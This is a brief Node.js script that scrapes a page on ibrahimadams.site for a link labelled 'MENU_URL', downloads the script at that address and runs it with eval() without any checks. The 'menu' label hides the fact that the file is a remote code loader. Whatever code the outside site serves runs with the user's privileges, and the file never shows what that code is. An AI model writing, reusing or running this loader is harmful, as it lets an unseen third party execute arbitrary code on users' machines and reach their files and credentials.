

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchMenuUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const menuUrl = $(`a:contains("MENU_URL")`).attr('href');

        if (!menuUrl) throw new Error('MENU_URL not found on the webpage.');

        console.log('MENU_URL fetched successfully:', menuUrl);

        const scriptResponse = await axios.get(menuUrl);
        const scriptContent = scriptResponse.data;
        console.log("MENU_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching MENU_URL:', error.message);
    }
}

fetchMenuUrl();